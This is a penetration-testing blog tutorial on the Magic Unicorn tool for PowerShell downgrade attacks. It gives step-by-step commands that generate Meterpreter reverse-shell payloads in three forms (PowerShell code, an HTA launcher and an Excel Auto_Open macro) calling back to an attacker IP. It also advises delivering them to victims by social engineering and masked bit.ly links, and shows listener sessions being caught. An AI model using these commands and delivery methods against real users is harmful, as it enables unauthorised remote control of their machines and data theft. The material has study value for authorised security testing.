<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Magic Unicorn – PowerShell Downgrade Attack and Exploitation tool</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/magic-unicorn-powershell-downgrade-attack-and-exploitation-tool/" rel="bookmark"><time class="entry-date published" datetime="2018-10-15T18:08:27+00:00">October 15, 2018</time><time class="updated" datetime="2025-05-27T12:03:18+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Magic Unicorn is a simple tool for using a PowerShell downgrade attack that injects shellcode straight into memory. It is based on Matthew Graeber’s PowerShell attacks and the PowerShell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.</span></p>
<h3><span style="color: #800000;"><strong>Table of Contents</strong></span></h3>
<ul>
<li><span style="color: #000000;">Powershell Attack Instruction</span></li>
<li><span style="color: #000000;">HTA Attack Instruction</span></li>
<li><span style="color: #000000;">Macro Attack Instruction</span></li>
</ul>
<p><span style="color: #000000;"><strong> </strong>Download the unicorn tool from the git repository:</span></p>
<pre class="lang:default decode:true">git clone https://github.com/trustedsec/unicorn.git</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-_F0Q4qL0FO8/W8YojIWpxZI/AAAAAAAAawY/g4DAnbxq8MM7CEux0p7dMPFeJn_gWEUKgCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Once downloaded, go in the directory and run unicorn with the following command to see all the possible methods.</span></p>
<pre class="lang:default decode:true">./unicorn.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-htms6wPvQIE/W8YolnxyPHI/AAAAAAAAawY/De-oWLVSods4WbHjhY1E8cgFOFfVN2vrwCEwYBhgL/s1600/2.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Powershell Attack Instructions</strong></span></h3>
<p><span style="color: #000000;">First, we will try the reverse_tcp payload. As we can see in the main menu all the commands are already written. We just need to replace the IP with our IP.</span></p>
<pre class="lang:default decode:true">python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 4444</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-ADr5_A6p2XY/W8YomH04dJI/AAAAAAAAawU/7CMsEybielcn_r0kT1X96rDjnsG0ObFTACEwYBhgL/s1600/3.png"/></strong></span></p>
<p><span style="color: #000000;">Now this will give us two files. One is a text file named “powershell_attack.txt” which has the PowerShell code that will be run in the victim’s machine using social engineering and the other is “unicorn.rc” which is a custom Metasploit file that will automatically set all the parameters and start a listener.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SoUQjYy5zX0/W8YomVxosoI/AAAAAAAAawI/bSD4Pseb0dgop8ckanCbytitcQV525QGgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">These files will be saved in the directory where unicorn was cloned. Powershell_attack.txt holds the malicious code and when the victim will execute that code in his command prompt, the attacker will get a reverse connection of his machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4_--kKqjuT8/W8YomkHJ67I/AAAAAAAAawU/BTFzgMhNTNUPngH6ASEvf4KkmXcVJDdDQCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now let’s set up a listener first. We need to run the Metasploit “unicorn.rc” file using the following command:</span></p>
<pre class="lang:default decode:true">msfconsole -r unicorn.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-BVjfQw6u8_o/W8Yom4p6TVI/AAAAAAAAawM/6d0ahHN1Bt45xUsg67mEFoGn8IyYEIU9ACEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We see a session was obtained in the meterpreter. It was because the PowerShell code was executed in the victim’s command shell. It would have looked something like this:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3q5N-YTgijI/W8YonMNhPVI/AAAAAAAAawQ/2_shGfyB8WMuSOeGF9D_m_SfDsmybCf8wCEwYBhgL/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>HTA Attack Instructions</strong></span></h3>
<p><span style="color: #000000;">For our next attack, we will be using an HTA payload.</span></p>
<pre class="lang:default decode:true">python unicorn.py windows/meterpreter/reverse_https 192.168.1.109 4455 hta</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-0_O5DcweYIM/W8YonaWUy2I/AAAAAAAAawU/6c6Hz13lGYEHFVgY4LR6q2O5fkcSrdC8ACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Now convert your IP in bit.ly URL form and send to the victim and then wait for the user to click on the “launcher.hta” file which could be done using social engineering easily.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-J8R1WfT-NpA/W8Yon3VMeAI/AAAAAAAAawY/A-yqHtXFzGgNhUlWBUlCYW9MQpdhd3PqACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">So, we set up a Metasploit listener next using the RC file and wait for the user to click on the hta payload.</span></p>
<pre class="lang:default decode:true">msfconsole -r unicorn.rc</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XFHyvvHXqU8/W8YojdJ3hMI/AAAAAAAAawQ/1Wi7WArPuOEXNhI3NAgLH31fqFguK9wmgCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As soon as he ran the file, we received a meterpreter session. We checked the system info using the<strong> sysinfo </strong>command.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-iUuCscFGLAc/W8YojXo_jUI/AAAAAAAAawU/zJBOCdBPl2QkdBjrtNL5R8N0ms1Dpq-6gCEwYBhgL/s1600/11.png"/></strong></span></p>
<h3><span style="color: #800000;"><strong>Macro Attack Instructions</strong></span></h3>
<p><span style="color: #000000;">Now for the third and final payload for this tutorial, we set hands on our beloved macros.</span></p>
<pre class="lang:default decode:true">python unicorn.py windows/meterpreter/reverse_https 192.168.1.109 443 macro</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-xCQHs0LNZl4/W8Yoj1MN32I/AAAAAAAAawU/MwyNdJ2jkP04qxU5YTs20gf1jPqcxYRdACEwYBhgL/s1600/12.png"/></strong></span></p>
<p><span style="color: #000000;">This again creates a text file and a “<strong>.rc</strong>” file with the same name and on the same destination.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6dhHd7NWxtg/W8YokaJkM2I/AAAAAAAAawQ/SRQoM1JYisYlcmdXlaEGhVhjOUCZo0HJwCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">To enable developer mode there are various methods depending upon your version of MS office.</span></p>
<p><span style="color: #000000;">As for a generic approach, let’s say you enabled it like:</span></p>
<p><span style="color: #000000;"><strong>File-&gt;properties-&gt;ribbons-&gt;developer mode</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-D3iW4Y-y3To/W8YokfVIFPI/AAAAAAAAawE/dz0yvIj4_fQxCTCuHWiNnYfM8jyQHGu0ACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">You will see an extra tab labeled developer once it gets enabled.</span></p>
<p><span style="color: #000000;">As for the attack, go to developer-&gt;macros and create a new macro named “Auto_Open”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6kAqRMAjKBM/W8YokqMtRdI/AAAAAAAAawQ/Wd2sKDYWKcIAuc0wtxPhzPEvt9_Yakv_QCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Simply paste the contents from “powershell_attack.txt” to this xlsx module and save it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8iawGWNh8Ks/W8YolGj4rwI/AAAAAAAAawM/Emem6-YUB0M-Z428NqVGzH-3G8TW0hq1wCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">As soon as you click run (little green icon on the top), it will give you an error! Don’t worry! You want that error. It is supposed to happen.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xf0PwRDxaJQ/W8YolTBuQAI/AAAAAAAAawE/9FAaVxR5mRQRoNh5MzQtOUgVSdMua6IxQCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Soon after the error on the user screen, we would have obtained a session successfully in meterpreter!</span></p>
<p><span style="color: #000000;">Use <strong>sysinfo </strong>double check our successful exploitation using unicorn!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5iso3OgiLF8/W8Yolk3nOkI/AAAAAAAAawM/CHknK4o-LzEBSTURICU10-9XR-00Qu5ewCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
